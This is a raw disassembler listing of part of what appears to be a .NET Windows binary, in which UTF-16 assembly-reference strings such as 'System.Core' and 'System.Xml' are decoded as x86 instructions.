  409a6d:	xor    al,0x0
  409a6f:	inc    esp
  409a70:	add    BYTE PTR ds:0x44004100,dh
  409a76:	add    BYTE PTR [edx],dh
  409a78:	add    BYTE PTR [ecx],bh
  409a7a:	add    BYTE PTR [ebx],dh
  409a7c:	add    BYTE PTR [eax],ah
  409a7e:	xor    eax,DWORD PTR [eax]
  409a80:	xor    DWORD PTR [eax],eax
  409a82:	bound  eax,QWORD PTR [eax]
  409a84:	data16 add BYTE PTR [ebx],dh
  409a87:	add    BYTE PTR [eax],bh
  409a89:	add    BYTE PTR ds:0x61003600,dh
  409a8f:	add    BYTE PTR [eax+eax*1+0x33],ah
  409a93:	add    BYTE PTR [esi],dh
  409a95:	add    BYTE PTR [eax+eax*1],dh
  409a98:	add    BYTE PTR gs:[ebx],dh
  409a9b:	add    BYTE PTR ds:0x30808200,dh
  409aa1:	add    BYTE PTR [eax],dh
  409aa3:	add    BYTE PTR [edx],dh
  409aa5:	add    BYTE PTR [eax+eax*1],dh
  409aa8:	xor    BYTE PTR [eax],al
  409aaa:	xor    BYTE PTR [eax],al
  409aac:	xor    BYTE PTR [eax],al
  409aae:	xor    BYTE PTR [eax],al
  409ab0:	xor    BYTE PTR [eax],al
  409ab2:	xor    al,0x0
  409ab4:	cmp    BYTE PTR [eax],al
  409ab6:	xor    BYTE PTR [eax],al
  409ab8:	xor    BYTE PTR [eax],al
  409aba:	xor    BYTE PTR [eax],al
  409abc:	xor    BYTE PTR [eax],al
  409abe:	xor    BYTE PTR [eax],al
  409ac0:	cmp    DWORD PTR [eax],eax
  409ac2:	xor    al,0x0
  409ac4:	xor    BYTE PTR [eax],al
  409ac6:	xor    BYTE PTR [eax],al
  409ac8:	xor    BYTE PTR [eax],al
  409aca:	xor    BYTE PTR [eax],al
  409acc:	xor    BYTE PTR [eax],al
  409ace:	xor    BYTE PTR [eax],al
  409ad0:	xor    BYTE PTR [eax],al
  409ad2:	add    BYTE PTR ss:[eax],dh
  409ad5:	add    BYTE PTR [edx],dh
  409ad7:	add    BYTE PTR [eax],dh
  409ad9:	add    BYTE PTR [eax],dh
  409adb:	add    BYTE PTR [eax],dh
  409add:	add    BYTE PTR [eax],dh
  409adf:	add    BYTE PTR [eax],dh
  409ae1:	add    BYTE PTR [eax],dh
  409ae3:	add    BYTE PTR [edx],dh
  409ae5:	add    BYTE PTR [eax+eax*1],dh
  409ae8:	xor    BYTE PTR [eax],al
  409aea:	xor    BYTE PTR [eax],al
  409aec:	xor    BYTE PTR [eax],al
  409aee:	xor    BYTE PTR [eax],al
  409af0:	xor    eax,0x35003200
  409af5:	add    BYTE PTR [ebx],dh
  409af7:	add    BYTE PTR [eax+eax*1],dh
  409afa:	xor    DWORD PTR [eax],eax
  409afc:	xor    eax,DWORD PTR [eax]
  409afe:	xor    DWORD PTR [eax],eax
  409b00:	xor    BYTE PTR [eax],al
  409b02:	xor    BYTE PTR [eax],al
  409b04:	xor    BYTE PTR [eax],al
  409b06:	xor    al,0x0
  409b08:	xor    BYTE PTR [eax],al
  409b0a:	xor    BYTE PTR [eax],al
  409b0c:	xor    BYTE PTR [eax],al
  409b0e:	xor    BYTE PTR [eax],al
  409b10:	xor    BYTE PTR [eax],al
  409b12:	xor    DWORD PTR [eax],eax
  409b14:	xor    BYTE PTR [eax],al
  409b16:	xor    BYTE PTR [eax],al
  409b18:	xor    BYTE PTR [eax],al
  409b1a:	xor    DWORD PTR [eax],eax
  409b1c:	xor    BYTE PTR [eax],al
  409b1e:	xor    BYTE PTR [eax],al
  409b20:	inc    edx
  409b21:	add    BYTE PTR ds:0x43004600,dh
  409b27:	add    BYTE PTR [ecx],bh
  409b29:	add    BYTE PTR [eax],dh
  409b2b:	add    BYTE PTR [ebp+0x0],al
  409b2e:	aaa    
  409b2f:	add    BYTE PTR [eax],dh
  409b31:	add    BYTE PTR [edx],dh
  409b33:	add    BYTE PTR [edi],dh
  409b35:	add    BYTE PTR [esi+0x0],al
  409b38:	add    BYTE PTR ss:[edi],dh
  409b3b:	add    BYTE PTR [eax],bh
  409b3d:	add    BYTE PTR [edi],dh
  409b3f:	add    BYTE PTR [ecx],dh
  409b41:	add    BYTE PTR [ebp+0x0],al
  409b44:	aaa    
  409b45:	add    BYTE PTR [edi],dh
  409b47:	add    BYTE PTR [ebx],dh
  409b49:	add    BYTE PTR [ecx+0x0],al
  409b4c:	cmp    BYTE PTR [eax],al
  409b4e:	inc    esi
  409b4f:	add    BYTE PTR [eax+eax*1+0x45],al
  409b53:	add    BYTE PTR [eax],bh
  409b55:	add    BYTE PTR [ecx],bh
  409b57:	add    BYTE PTR [ebx],dh
  409b59:	add    BYTE PTR [eax],bh
  409b5b:	add    BYTE PTR [ebx+0x0],al
  409b5e:	cmp    BYTE PTR [eax],al
  409b60:	xor    DWORD PTR [eax],eax
  409b62:	inc    esp
  409b63:	add    BYTE PTR [eax+eax*1+0x34],al
  409b67:	add    BYTE PTR [eax],dh
  409b69:	add    BYTE PTR [edx],dh
  409b6b:	add    BYTE PTR [edx+0x0],al
  409b6e:	inc    ecx
  409b6f:	add    BYTE PTR [esi],dh
  409b71:	add    BYTE PTR ds:0x39004200,dh
  409b77:	add    BYTE PTR [edx],dh
  409b79:	add    BYTE PTR [eax],dh
  409b7b:	add    BYTE PTR [ecx],dh
  409b7d:	add    BYTE PTR [eax+eax*1+0x36],al
  409b81:	add    BYTE PTR [eax],dh
  409b83:	add    BYTE PTR ds:0x33003900,dh
  409b89:	add    BYTE PTR [ebp+0x0],al
  409b8c:	cmp    DWORD PTR [eax],eax
  409b8e:	add    BYTE PTR ss:[ebx+0x0],al
  409b92:	xor    al,0x0
  409b94:	cmp    DWORD PTR [eax],eax
  409b96:	xor    al,BYTE PTR [eax]
  409b98:	add    BYTE PTR ss:0x45003100,dh
  409b9f:	add    BYTE PTR [eax],bh
  409ba1:	add    BYTE PTR [eax],bh
  409ba3:	add    BYTE PTR [ecx],bh
  409ba5:	add    BYTE PTR [ebx+0x0],al
  409ba8:	inc    ebx
  409ba9:	add    BYTE PTR [ecx],dh
  409bab:	add    BYTE PTR [ebx],dh
  409bad:	add    BYTE PTR [esi+0x0],al
  409bb0:	xor    DWORD PTR [eax],eax
  409bb2:	xor    al,0x0
  409bb4:	xor    DWORD PTR [eax],eax
  409bb6:	xor    eax,0x42004500
  409bbb:	add    BYTE PTR [edx+0x0],al
  409bbe:	xor    eax,0x46003300
  409bc3:	add    BYTE PTR [ecx+0x0],al
  409bc6:	inc    ebx
  409bc7:	add    BYTE PTR [ecx],dh
  409bc9:	add    BYTE PTR [ecx],dh
  409bcb:	add    BYTE PTR [ebx],dh
  409bcd:	add    BYTE PTR [ecx],dh
  409bcf:	add    BYTE PTR [ecx+0x0],al
  409bd2:	inc    ebp
  409bd3:	add    BYTE PTR [eax],dh
  409bd5:	add    BYTE PTR [edx+0x0],al
  409bd8:	inc    esp
  409bd9:	add    BYTE PTR [ebx],dh
  409bdb:	add    BYTE PTR [ebx],dh
  409bdd:	add    BYTE PTR [ebx],dh
  409bdf:	add    BYTE PTR [ebx+0x0],al
  409be2:	xor    eax,0x45004500
  409be7:	add    BYTE PTR [esi],dh
  409be9:	add    BYTE PTR [eax],dh
  409beb:	add    BYTE PTR [edx],dh
  409bed:	add    BYTE PTR [ecx],dh
  409bef:	add    BYTE PTR [esi],dh
  409bf1:	add    BYTE PTR [edi],dh
  409bf3:	add    BYTE PTR [edx],dh
  409bf5:	add    BYTE PTR [eax+eax*1+0x39],al
  409bf9:	add    BYTE PTR [edi],dh
  409bfb:	add    BYTE PTR [ecx],dh
  409bfd:	add    BYTE PTR [eax],bh
  409bff:	add    BYTE PTR [ebp+0x0],al
  409c02:	inc    ecx
  409c03:	add    BYTE PTR [ebx],dh
  409c05:	add    BYTE PTR [ecx],dh
  409c07:	add    BYTE PTR [ecx+0x0],al
  409c0a:	cmp    BYTE PTR [eax],al
  409c0c:	inc    ecx
  409c0d:	add    BYTE PTR [ebp+0x0],al
  409c10:	inc    edx
  409c11:	add    BYTE PTR [eax+eax*1+0x30],al
  409c15:	add    BYTE PTR [eax+eax*1+0x41],al
  409c19:	add    BYTE PTR [eax],dh
  409c1b:	add    BYTE PTR [eax],dh
  409c1d:	add    BYTE PTR [edi],dh
  409c1f:	add    BYTE PTR [edx],dh
  409c21:	add    BYTE PTR [esi+0x0],al
  409c24:	xor    al,BYTE PTR [eax]
  409c26:	xor    eax,0x38004400
  409c2b:	add    BYTE PTR [edi],dh
  409c2d:	add    BYTE PTR [eax+eax*1+0x42],al
  409c31:	add    BYTE PTR [ecx+0x0],al
  409c34:	add    BYTE PTR ss:[esi+0x0],al
  409c38:	inc    ebx
  409c39:	add    BYTE PTR [ecx],bh
  409c3b:	add    BYTE PTR [eax],dh
  409c3d:	add    BYTE PTR [esi+0x0],al
  409c40:	inc    esi
  409c41:	add    BYTE PTR [eax+eax*1+0x35],al
  409c45:	add    BYTE PTR [ecx],bh
  409c47:	add    BYTE PTR [eax],bh
  409c49:	add    BYTE PTR [ebp+0x0],al
  409c4c:	inc    esp
  409c4d:	add    BYTE PTR [eax+eax*1],dh
  409c50:	inc    esp
  409c51:	add    BYTE PTR [ecx+0x0],al
  409c54:	xor    eax,DWORD PTR [eax]
  409c56:	xor    eax,0x34004500
  409c5b:	add    BYTE PTR [eax+eax*1],dh
  409c5e:	inc    ebx
  409c5f:	add    BYTE PTR [ebx],dh
  409c61:	add    BYTE PTR [ecx],bh
  409c63:	add    BYTE PTR [eax],bh
  409c65:	add    BYTE PTR [ebx+0x0],al
  409c68:	xor    al,0x0
  409c6a:	xor    eax,0x33003400
  409c6f:	add    BYTE PTR [eax],dh
  409c71:	add    BYTE PTR [edi],dh
  409c73:	add    BYTE PTR [ebp+0x0],al
  409c76:	cmp    BYTE PTR [eax],al
  409c78:	inc    ebp
  409c79:	add    BYTE PTR [ebx],dh
  409c7b:	add    BYTE PTR [ebx],dh
  409c7d:	add    BYTE PTR [edx+0x0],al
  409c80:	cmp    BYTE PTR [eax],al
  409c82:	xor    al,0x0
  409c84:	xor    al,BYTE PTR [eax]
  409c86:	add    BYTE PTR ss:[ecx],dh
  409c89:	add    BYTE PTR [eax+eax*1],dh
  409c8c:	xor    eax,DWORD PTR [eax]
  409c8e:	inc    esp
  409c8f:	add    BYTE PTR [ecx+0x0],al
  409c92:	inc    ebp
  409c93:	add    BYTE PTR [ebx+0x0],al
  409c96:	cmp    DWORD PTR [eax],eax
  409c98:	inc    esi
  409c99:	add    BYTE PTR ds:0x36003900,dh
  409c9f:	add    BYTE PTR [eax],bh
  409ca1:	add    BYTE PTR [ebx],dh
  409ca3:	add    BYTE PTR [esi],dh
  409ca5:	add    BYTE PTR [esi+0x0],al
  409ca8:	cmp    DWORD PTR [eax],eax
  409caa:	aaa    
  409cab:	add    BYTE PTR [ebx+0x0],al
  409cae:	cmp    BYTE PTR [eax],al
  409cb0:	inc    esi
  409cb1:	add    BYTE PTR [edi],dh
  409cb3:	add    BYTE PTR [eax+eax*1],dh
  409cb6:	aaa    
  409cb7:	add    BYTE PTR ds:0x45003000,dh
  409cbd:	add    BYTE PTR ds:0x37003900,dh
  409cc3:	add    BYTE PTR ds:0x36004300,dh
  409cc9:	add    BYTE PTR [eax+eax*1],dh
  409ccc:	inc    ebp
  409ccd:	add    BYTE PTR [edx],dh
  409ccf:	add    BYTE PTR [ecx],dh
  409cd1:	add    BYTE PTR [eax],bh
  409cd3:	add    BYTE PTR [ecx],bh
  409cd5:	add    BYTE PTR [esi+0x0],al
  409cd8:	xor    al,0x0
  409cda:	xor    eax,0x45004400
  409cdf:	add    BYTE PTR [esi+0x0],al
  409ce2:	xor    al,0x0
  409ce4:	add    BYTE PTR ss:[edx+0x0],al
  409ce8:	xor    al,BYTE PTR [eax]
  409cea:	inc    ecx
  409ceb:	add    BYTE PTR [edx],dh
  409ced:	add    BYTE PTR [edx+0x0],al
  409cf0:	xor    DWORD PTR [eax],eax
  409cf2:	xor    al,BYTE PTR [eax]
  409cf4:	xor    al,0x0
  409cf6:	aaa    
  409cf7:	add    BYTE PTR [ecx+0x0],al
  409cfa:	inc    esp
  409cfb:	add    BYTE PTR [ebx+0x0],al
  409cfe:	xor    eax,DWORD PTR [eax]
  409d00:	add    BYTE PTR ss:0x42003200,dh
  409d07:	add    BYTE PTR [esi+0x0],al
  409d0a:	xor    eax,0x33004300
  409d0f:	add    BYTE PTR [eax],dh
  409d11:	add    BYTE PTR [eax],bh
  409d13:	add    BYTE PTR [eax],dh
  409d15:	add    BYTE PTR ds:0x44003500,dh
  409d1b:	add    BYTE PTR [ecx+0x0],al
  409d1e:	cmp    DWORD PTR [eax],eax
  409d20:	adc    al,0x53
  409d23:	add    BYTE PTR [ecx+0x0],bh
  409d26:	jae    0x409d28
  409d28:	je     0x409d2a
  409d2a:	add    BYTE PTR gs:[ebp+0x0],ch
  409d2e:	add    BYTE PTR cs:[ebx+0x0],al
  409d32:	outs   dx,DWORD PTR ds:[esi]
  409d33:	add    BYTE PTR [ebp+0x0],ch
  409d36:	jo     0x409d38
  409d38:	outs   dx,DWORD PTR ds:[esi]
  409d39:	add    BYTE PTR [esi+0x0],ch
  409d3c:	add    BYTE PTR gs:[esi+0x0],ch
  409d40:	je     0x409d42
  409d42:	dec    ebp
  409d43:	add    BYTE PTR [edi+0x0],ch
  409d46:	add    BYTE PTR fs:[ebp+0x0],ah
  409d4a:	ins    BYTE PTR es:[edi],dx
  409d4b:	add    BYTE PTR [esi],ch
  409d4d:	add    BYTE PTR [eax+eax*1+0x61],al
  409d51:	add    BYTE PTR [eax+eax*1+0x61],dh
  409d55:	add    BYTE PTR [ecx+0x0],al
  409d58:	outs   dx,BYTE PTR ds:[esi]
  409d59:	add    BYTE PTR [esi+0x0],ch
  409d5c:	outs   dx,DWORD PTR ds:[esi]
  409d5d:	add    BYTE PTR [eax+eax*1+0x61],dh
  409d61:	add    BYTE PTR [eax+eax*1+0x69],dh
  409d65:	add    BYTE PTR [edi+0x0],ch
  409d68:	outs   dx,BYTE PTR ds:[esi]
  409d69:	add    BYTE PTR [ebx+0x0],dh
  409d6c:	sub    al,0x0
  409d6e:	and    BYTE PTR [eax],al
  409d70:	push   esi
  409d71:	add    BYTE PTR [ebp+0x0],ah
  409d74:	jb     0x409d76
  409d76:	jae    0x409d78
  409d78:	imul   eax,DWORD PTR [eax],0x6e006f
  409d7e:	cmp    eax,0x2e003300
  409d83:	add    BYTE PTR ds:0x30002e00,dh
  409d89:	add    BYTE PTR [esi],ch
  409d8b:	add    BYTE PTR [eax],dh
  409d8d:	add    BYTE PTR [eax+eax*1],ch
  409d90:	and    BYTE PTR [eax],al
  409d92:	inc    ebx
  409d93:	add    BYTE PTR [ebp+0x0],dh
  409d96:	ins    BYTE PTR es:[edi],dx
  409d97:	add    BYTE PTR [eax+eax*1+0x75],dh
  409d9b:	add    BYTE PTR [edx+0x0],dh
  409d9e:	add    BYTE PTR gs:0x65006e00,bh
  409da5:	add    BYTE PTR [ebp+0x0],dh
  409da8:	je     0x409daa
  409daa:	jb     0x409dac
  409dac:	popa   
  409dad:	add    BYTE PTR [eax+eax*1+0x2c],ch
  409db1:	add    BYTE PTR [eax],ah
  409db3:	add    BYTE PTR [eax+0x0],dl
  409db6:	jne    0x409db8
  409db8:	bound  eax,QWORD PTR [eax]
  409dba:	ins    BYTE PTR es:[edi],dx
  409dbb:	add    BYTE PTR [ecx+0x0],ch
  409dbe:	arpl   WORD PTR [eax],ax
  409dc0:	dec    ebx
  409dc1:	add    BYTE PTR [ebp+0x0],ah
  409dc4:	jns    0x409dc6
  409dc6:	push   esp
  409dc7:	add    BYTE PTR [edi+0x0],ch
  409dca:	imul   eax,DWORD PTR [eax],0x65
  409dcd:	add    BYTE PTR [esi+0x0],ch
  409dd0:	cmp    eax,0x31003300
  409dd5:	add    BYTE PTR [edx+0x0],ah
  409dd8:	data16 add BYTE PTR [ebx],dh
  409ddb:	add    BYTE PTR [eax],bh
  409ddd:	add    BYTE PTR ds:0x61003600,dh
  409de3:	add    BYTE PTR [eax+eax*1+0x33],ah
  409de7:	add    BYTE PTR [esi],dh
  409de9:	add    BYTE PTR [eax+eax*1],dh
  409dec:	add    BYTE PTR gs:[ebx],dh
  409def:	add    BYTE PTR ds:0x53ae8000,dh
  409df5:	add    BYTE PTR [ecx+0x0],bh
  409df8:	jae    0x409dfa
  409dfa:	je     0x409dfc
  409dfc:	add    BYTE PTR gs:[ebp+0x0],ch
  409e00:	add    BYTE PTR cs:[ebx+0x0],al
  409e04:	outs   dx,DWORD PTR ds:[esi]
  409e05:	add    BYTE PTR [esi+0x0],ch
  409e08:	data16 add BYTE PTR [ecx+0x0],ch
  409e0c:	add    BYTE PTR [di+0x0],dh
  409e10:	jb     0x409e12
  409e12:	popa   
  409e13:	add    BYTE PTR [eax+eax*1+0x69],dh
  409e17:	add    BYTE PTR [edi+0x0],ch
  409e1a:	outs   dx,BYTE PTR ds:[esi]
  409e1b:	add    BYTE PTR [eax+eax*1],ch
  409e1e:	and    BYTE PTR [eax],al
  409e20:	push   esi
  409e21:	add    BYTE PTR [ebp+0x0],ah
  409e24:	jb     0x409e26
  409e26:	jae    0x409e28
  409e28:	imul   eax,DWORD PTR [eax],0x6e006f
  409e2e:	cmp    eax,0x2e003200
  409e33:	add    BYTE PTR [eax],dh
  409e35:	add    BYTE PTR [esi],ch
  409e37:	add    BYTE PTR [eax],dh
  409e39:	add    BYTE PTR [esi],ch
  409e3b:	add    BYTE PTR [eax],dh
  409e3d:	add    BYTE PTR [eax+eax*1],ch
  409e40:	and    BYTE PTR [eax],al
  409e42:	inc    ebx
  409e43:	add    BYTE PTR [ebp+0x0],dh
  409e46:	ins    BYTE PTR es:[edi],dx
  409e47:	add    BYTE PTR [eax+eax*1+0x75],dh
  409e4b:	add    BYTE PTR [edx+0x0],dh
  409e4e:	add    BYTE PTR gs:0x65006e00,bh
  409e55:	add    BYTE PTR [ebp+0x0],dh
  409e58:	je     0x409e5a
  409e5a:	jb     0x409e5c
  409e5c:	popa   
  409e5d:	add    BYTE PTR [eax+eax*1+0x2c],ch
  409e61:	add    BYTE PTR [eax],ah
  409e63:	add    BYTE PTR [eax+0x0],dl
  409e66:	jne    0x409e68
  409e68:	bound  eax,QWORD PTR [eax]
  409e6a:	ins    BYTE PTR es:[edi],dx
  409e6b:	add    BYTE PTR [ecx+0x0],ch
  409e6e:	arpl   WORD PTR [eax],ax
  409e70:	dec    ebx
  409e71:	add    BYTE PTR [ebp+0x0],ah
  409e74:	jns    0x409e76
  409e76:	push   esp
  409e77:	add    BYTE PTR [edi+0x0],ch
  409e7a:	imul   eax,DWORD PTR [eax],0x65
  409e7d:	add    BYTE PTR [esi+0x0],ch
  409e80:	cmp    eax,0x30006200
  409e85:	add    BYTE PTR [ebx],dh
  409e87:	add    BYTE PTR [esi+0x0],ah
  409e8a:	xor    eax,0x37006600
  409e8f:	add    BYTE PTR [esi+0x0],ah
  409e92:	xor    DWORD PTR [eax],eax
  409e94:	xor    DWORD PTR [eax],eax
  409e96:	add    BYTE PTR fs:0x61003000,dh
  409e9d:	add    BYTE PTR [ebx],dh
  409e9f:	add    BYTE PTR [ecx+0x0],ah
  409ea2:	cmp    BYTE PTR [esi+0x790053],0x73
  409ea9:	add    BYTE PTR [eax+eax*1+0x65],dh
  409ead:	add    BYTE PTR [ebp+0x0],ch
  409eb0:	add    BYTE PTR cs:[ebx+0x0],al
  409eb4:	outs   dx,DWORD PTR ds:[esi]
  409eb5:	add    BYTE PTR [esi+0x0],ch
  409eb8:	data16 add BYTE PTR [ecx+0x0],ch
  409ebc:	add    BYTE PTR [di+0x0],dh
  409ec0:	jb     0x409ec2
  409ec2:	popa   
  409ec3:	add    BYTE PTR [eax+eax*1+0x69],dh
  409ec7:	add    BYTE PTR [edi+0x0],ch
  409eca:	outs   dx,BYTE PTR ds:[esi]
  409ecb:	add    BYTE PTR [esi],ch
  409ecd:	add    BYTE PTR [ecx+0x0],cl
  409ed0:	outs   dx,BYTE PTR ds:[esi]
  409ed1:	add    BYTE PTR [ebx+0x0],dh
  409ed4:	je     0x409ed6
  409ed6:	popa   
  409ed7:	add    BYTE PTR [eax+eax*1+0x6c],ch
  409edb:	add    BYTE PTR [eax+eax*1],ch
  409ede:	and    BYTE PTR [eax],al
  409ee0:	push   esi
  409ee1:	add    BYTE PTR [ebp+0x0],ah
  409ee4:	jb     0x409ee6
  409ee6:	jae    0x409ee8
  409ee8:	imul   eax,DWORD PTR [eax],0x6e006f
  409eee:	cmp    eax,0x2e003200
  409ef3:	add    BYTE PTR [eax],dh
  409ef5:	add    BYTE PTR [esi],ch
  409ef7:	add    BYTE PTR [eax],dh
  409ef9:	add    BYTE PTR [esi],ch
  409efb:	add    BYTE PTR [eax],dh
  409efd:	add    BYTE PTR [eax+eax*1],ch
  409f00:	and    BYTE PTR [eax],al
  409f02:	inc    ebx
  409f03:	add    BYTE PTR [ebp+0x0],dh
  409f06:	ins    BYTE PTR es:[edi],dx
  409f07:	add    BYTE PTR [eax+eax*1+0x75],dh
  409f0b:	add    BYTE PTR [edx+0x0],dh
  409f0e:	add    BYTE PTR gs:0x65006e00,bh
  409f15:	add    BYTE PTR [ebp+0x0],dh
  409f18:	je     0x409f1a
  409f1a:	jb     0x409f1c
  409f1c:	popa   
  409f1d:	add    BYTE PTR [eax+eax*1+0x2c],ch
  409f21:	add    BYTE PTR [eax],ah
  409f23:	add    BYTE PTR [eax+0x0],dl
  409f26:	jne    0x409f28
  409f28:	bound  eax,QWORD PTR [eax]
  409f2a:	ins    BYTE PTR es:[edi],dx
  409f2b:	add    BYTE PTR [ecx+0x0],ch
  409f2e:	arpl   WORD PTR [eax],ax
  409f30:	dec    ebx
  409f31:	add    BYTE PTR [ebp+0x0],ah
  409f34:	jns    0x409f36
  409f36:	push   esp
  409f37:	add    BYTE PTR [edi+0x0],ch
  409f3a:	imul   eax,DWORD PTR [eax],0x65
  409f3d:	add    BYTE PTR [esi+0x0],ch
  409f40:	cmp    eax,0x30006200
  409f45:	add    BYTE PTR [ebx],dh
  409f47:	add    BYTE PTR [esi+0x0],ah
  409f4a:	xor    eax,0x37006600
  409f4f:	add    BYTE PTR [esi+0x0],ah
  409f52:	xor    DWORD PTR [eax],eax
  409f54:	xor    DWORD PTR [eax],eax
  409f56:	add    BYTE PTR fs:0x61003000,dh
  409f5d:	add    BYTE PTR [ebx],dh
  409f5f:	add    BYTE PTR [ecx+0x0],ah
  409f62:	sub    BYTE PTR [eax+0x790053],0x73
  409f69:	add    BYTE PTR [eax+eax*1+0x65],dh
  409f6d:	add    BYTE PTR [ebp+0x0],ch
  409f70:	add    BYTE PTR cs:[eax+eax*1+0x65],al
  409f75:	add    BYTE PTR [eax+0x0],dh
  409f78:	ins    BYTE PTR es:[edi],dx
  409f79:	add    BYTE PTR [edi+0x0],ch
  409f7c:	jns    0x409f7e
  409f7e:	ins    DWORD PTR es:[edi],dx
  409f7f:	add    BYTE PTR [ebp+0x0],ah
  409f82:	outs   dx,BYTE PTR ds:[esi]
  409f83:	add    BYTE PTR [eax+eax*1+0x2c],dh
  409f87:	add    BYTE PTR [eax],ah
  409f89:	add    BYTE PTR [esi+0x0],dl
  409f8c:	add    BYTE PTR gs:[edx+0x0],dh
  409f90:	jae    0x409f92
  409f92:	imul   eax,DWORD PTR [eax],0x6e006f
  409f98:	cmp    eax,0x2e003200
  409f9d:	add    BYTE PTR [eax],dh
  409f9f:	add    BYTE PTR [esi],ch
  409fa1:	add    BYTE PTR [eax],dh
  409fa3:	add    BYTE PTR [esi],ch
  409fa5:	add    BYTE PTR [eax],dh
  409fa7:	add    BYTE PTR [eax+eax*1],ch
  409faa:	and    BYTE PTR [eax],al
  409fac:	inc    ebx
  409fad:	add    BYTE PTR [ebp+0x0],dh
  409fb0:	ins    BYTE PTR es:[edi],dx
  409fb1:	add    BYTE PTR [eax+eax*1+0x75],dh
  409fb5:	add    BYTE PTR [edx+0x0],dh
  409fb8:	add    BYTE PTR gs:0x65006e00,bh
  409fbf:	add    BYTE PTR [ebp+0x0],dh
  409fc2:	je     0x409fc4
  409fc4:	jb     0x409fc6
  409fc6:	popa   
  409fc7:	add    BYTE PTR [eax+eax*1+0x2c],ch
  409fcb:	add    BYTE PTR [eax],ah
  409fcd:	add    BYTE PTR [eax+0x0],dl
  409fd0:	jne    0x409fd2
  409fd2:	bound  eax,QWORD PTR [eax]
  409fd4:	ins    BYTE PTR es:[edi],dx
  409fd5:	add    BYTE PTR [ecx+0x0],ch
  409fd8:	arpl   WORD PTR [eax],ax
  409fda:	dec    ebx
  409fdb:	add    BYTE PTR [ebp+0x0],ah
  409fde:	jns    0x409fe0
  409fe0:	push   esp
  409fe1:	add    BYTE PTR [edi+0x0],ch
  409fe4:	imul   eax,DWORD PTR [eax],0x65
  409fe7:	add    BYTE PTR [esi+0x0],ch
  409fea:	cmp    eax,0x30006200
  409fef:	add    BYTE PTR [ebx],dh
  409ff1:	add    BYTE PTR [esi+0x0],ah
  409ff4:	xor    eax,0x37006600
  409ff9:	add    BYTE PTR [esi+0x0],ah
  409ffc:	xor    DWORD PTR [eax],eax
  409ffe:	xor    DWORD PTR [eax],eax
  40a000:	add    BYTE PTR fs:0x61003000,dh
  40a007:	add    BYTE PTR [ebx],dh
  40a009:	add    BYTE PTR [ecx+0x0],ah
  40a00c:	and    BYTE PTR [eax+0x790053],0x73
  40a013:	add    BYTE PTR [eax+eax*1+0x65],dh
  40a017:	add    BYTE PTR [ebp+0x0],ch
  40a01a:	add    BYTE PTR cs:[eax+eax*1+0x65],al
  40a01f:	add    BYTE PTR [ebx+0x0],dh
  40a022:	imul   eax,DWORD PTR [eax],0x6e0067
  40a028:	sub    al,0x0
  40a02a:	and    BYTE PTR [eax],al
  40a02c:	push   esi
  40a02d:	add    BYTE PTR [ebp+0x0],ah
  40a030:	jb     0x40a032
  40a032:	jae    0x40a034
  40a034:	imul   eax,DWORD PTR [eax],0x6e006f
  40a03a:	cmp    eax,0x2e003200
  40a03f:	add    BYTE PTR [eax],dh
  40a041:	add    BYTE PTR [esi],ch
  40a043:	add    BYTE PTR [eax],dh
  40a045:	add    BYTE PTR [esi],ch
  40a047:	add    BYTE PTR [eax],dh
  40a049:	add    BYTE PTR [eax+eax*1],ch
  40a04c:	and    BYTE PTR [eax],al
  40a04e:	inc    ebx
  40a04f:	add    BYTE PTR [ebp+0x0],dh
  40a052:	ins    BYTE PTR es:[edi],dx
  40a053:	add    BYTE PTR [eax+eax*1+0x75],dh
  40a057:	add    BYTE PTR [edx+0x0],dh
  40a05a:	add    BYTE PTR gs:0x65006e00,bh
  40a061:	add    BYTE PTR [ebp+0x0],dh
  40a064:	je     0x40a066
  40a066:	jb     0x40a068
  40a068:	popa   
  40a069:	add    BYTE PTR [eax+eax*1+0x2c],ch
  40a06d:	add    BYTE PTR [eax],ah
  40a06f:	add    BYTE PTR [eax+0x0],dl
  40a072:	jne    0x40a074
  40a074:	bound  eax,QWORD PTR [eax]
  40a076:	ins    BYTE PTR es:[edi],dx
  40a077:	add    BYTE PTR [ecx+0x0],ch
  40a07a:	arpl   WORD PTR [eax],ax
  40a07c:	dec    ebx
  40a07d:	add    BYTE PTR [ebp+0x0],ah
  40a080:	jns    0x40a082
  40a082:	push   esp
  40a083:	add    BYTE PTR [edi+0x0],ch
  40a086:	imul   eax,DWORD PTR [eax],0x65
  40a089:	add    BYTE PTR [esi+0x0],ch
  40a08c:	cmp    eax,0x30006200
  40a091:	add    BYTE PTR [ebx],dh
  40a093:	add    BYTE PTR [esi+0x0],ah
  40a096:	xor    eax,0x37006600
  40a09b:	add    BYTE PTR [esi+0x0],ah
  40a09e:	xor    DWORD PTR [eax],eax
  40a0a0:	xor    DWORD PTR [eax],eax
  40a0a2:	add    BYTE PTR fs:0x61003000,dh
  40a0a9:	add    BYTE PTR [ebx],dh
  40a0ab:	add    BYTE PTR [ecx+0x0],ah
  40a0ae:	xor    BYTE PTR [esi+0x790053],0x73
  40a0b5:	add    BYTE PTR [eax+eax*1+0x65],dh
  40a0b9:	add    BYTE PTR [ebp+0x0],ch
  40a0bc:	add    BYTE PTR cs:[eax+eax*1+0x69],al
  40a0c1:	add    BYTE PTR [edx+0x0],dh
  40a0c4:	add    BYTE PTR gs:[ebx+0x0],ah
  40a0c8:	je     0x40a0ca
  40a0ca:	outs   dx,DWORD PTR ds:[esi]
  40a0cb:	add    BYTE PTR [edx+0x0],dh
  40a0ce:	jns    0x40a0d0
  40a0d0:	push   ebx
  40a0d1:	add    BYTE PTR [ebp+0x0],ah
  40a0d4:	jb     0x40a0d6
  40a0d6:	jbe    0x40a0d8
  40a0d8:	imul   eax,DWORD PTR [eax],0x650063
  40a0de:	jae    0x40a0e0
  40a0e0:	sub    al,0x0
  40a0e2:	and    BYTE PTR [eax],al
  40a0e4:	push   esi
  40a0e5:	add    BYTE PTR [ebp+0x0],ah
  40a0e8:	jb     0x40a0ea
  40a0ea:	jae    0x40a0ec
  40a0ec:	imul   eax,DWORD PTR [eax],0x6e006f
  40a0f2:	cmp    eax,0x2e003200
  40a0f7:	add    BYTE PTR [eax],dh
  40a0f9:	add    BYTE PTR [esi],ch
  40a0fb:	add    BYTE PTR [eax],dh
  40a0fd:	add    BYTE PTR [esi],ch
  40a0ff:	add    BYTE PTR [eax],dh
  40a101:	add    BYTE PTR [eax+eax*1],ch
  40a104:	and    BYTE PTR [eax],al
  40a106:	inc    ebx
  40a107:	add    BYTE PTR [ebp+0x0],dh
  40a10a:	ins    BYTE PTR es:[edi],dx
  40a10b:	add    BYTE PTR [eax+eax*1+0x75],dh
  40a10f:	add    BYTE PTR [edx+0x0],dh
